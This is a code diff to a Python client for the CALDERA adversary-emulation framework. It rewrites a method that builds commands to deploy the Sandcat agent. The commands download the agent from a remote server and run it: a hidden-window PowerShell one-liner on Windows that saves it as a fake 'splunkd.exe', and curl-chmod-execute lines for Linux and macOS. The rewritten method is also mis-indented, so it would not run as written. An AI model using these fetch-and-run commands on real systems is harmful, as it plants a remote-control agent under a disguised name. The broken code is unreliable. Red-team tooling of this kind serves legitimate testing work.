@@ -352,34 +352,117 @@ class CalderaClient:
             return "sandcat.go"
         return "sandcat.go"
 
-    def generate_sandcat_command(self, kali_ip=None, group='red', platform='windows'):
+    def generate_sandcat_command(
+    self,
+    kali_ip=None,
+    group="red",
+    platform="unknown",
+    ):
+    server = self._reachable_server_url(kali_ip)
 
-        server = self._reachable_server_url(kali_ip)
-        if not server:
-            return (
-                "$server=\"http://CHANGE-ME:8888\"; # change CHANGE-ME to your Kali VM IP"
-            )
-        payload_name = self._sandcat_payload_name(platform)
+    if not server:
+        return {
+            "supported": False,
+            "platform": platform,
+            "shell": "none",
+            "command": "",
+            "message": (
+                "CALDERA is configured with a loopback address. "
+                "Configure KALI_IP with an address reachable from the target."
+            ),
+        }
 
-        if "win" in str(platform or "").lower():
-            return (
-                f"$server=\"{server}\";"
-                "$url=\"$server/file/download\";"
-                "$wc=New-Object System.Net.WebClient;"
-                "$wc.Headers.add(\"platform\",\"windows\");"
-                f"$wc.Headers.add(\"file\",\"{payload_name}\");"
-                "$data=$wc.DownloadData($url);"
-                "get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f;"
-                "rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore;"
-                "[io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;"
-                f"Start-Process -FilePath C:\\Users\\Public\\splunkd.exe -ArgumentList \"-server $server -group {group}\" -WindowStyle hidden;"
-            )
+    platform = str(platform or "unknown").strip().lower()
+    payload_name = self._sandcat_payload_name(platform)
 
-        return (
-            f"server='{server}'; "
-            f"curl -fsSL -H 'file:{payload_name}' -H 'platform:linux' \"$server/file/download\" -o sandcat; "
-            f"chmod +x sandcat; ./sandcat -server \"$server\" -group {group}"
+    if platform == "windows":
+        command = (
+            f'$server="{server}";'
+            '$url="$server/file/download";'
+            '$wc=New-Object System.Net.WebClient;'
+            '$wc.Headers.Add("platform","windows");'
+            f'$wc.Headers.Add("file","{payload_name}");'
+            '$destination="$env:PUBLIC\\splunkd.exe";'
+            '$data=$wc.DownloadData($url);'
+            '[IO.File]::WriteAllBytes($destination,$data);'
+            f'Start-Process -FilePath $destination '
+            f'-ArgumentList "-server $server -group {group}" '
+            '-WindowStyle Hidden;'
         )
+
+        return {
+            "supported": True,
+            "platform": "windows",
+            "shell": "powershell",
+            "command": command,
+            "message": "Run in Windows PowerShell on the authorised target.",
+        }
+
+    if platform == "windows_legacy":
+        return {
+            "supported": False,
+            "platform": "windows_legacy",
+            "shell": "manual",
+            "command": "",
+            "message": (
+                "Legacy Windows was detected. Automatic Sandcat deployment "
+                "is disabled because the target may not provide a compatible "
+                "PowerShell runtime or supported Sandcat binary. Deploy a "
+                "tested legacy-compatible agent manually, or use a supported "
+                "Windows target for CALDERA execution."
+            ),
+        }
+
+    if platform == "linux":
+        command = (
+            f"server='{server}'; "
+            f"curl -fsSL "
+            f"-H 'file:{payload_name}' "
+            f"-H 'platform:linux' "
+            f"\"$server/file/download\" "
+            f"-o /tmp/sandcat && "
+            f"chmod +x /tmp/sandcat && "
+            f"/tmp/sandcat -server \"$server\" -group {group}"
+        )
+
+        return {
+            "supported": True,
+            "platform": "linux",
+            "shell": "bash",
+            "command": command,
+            "message": "Run in a Linux shell on the authorised target.",
+        }
+
+    if platform == "darwin":
+        command = (
+            f"server='{server}'; "
+            f"curl -fsSL "
+            f"-H 'file:{payload_name}' "
+            f"-H 'platform:darwin' "
+            f"\"$server/file/download\" "
+            f"-o /tmp/sandcat && "
+            f"chmod +x /tmp/sandcat && "
+            f"/tmp/sandcat -server \"$server\" -group {group}"
+        )
+
+        return {
+            "supported": True,
+            "platform": "darwin",
+            "shell": "bash",
+            "command": command,
+            "message": "Run in Terminal on the authorised macOS target.",
+        }
+
+    return {
+        "supported": False,
+        "platform": "unknown",
+        "shell": "none",
+        "command": "",
+        "message": (
+            "The target operating system could not be identified. "
+            "Run OS detection before generating a deployment command."
+        ),
+    }
 
     def get_adversary_list(self):
         """Alias for get_adversaries() - backwards compatibility."""
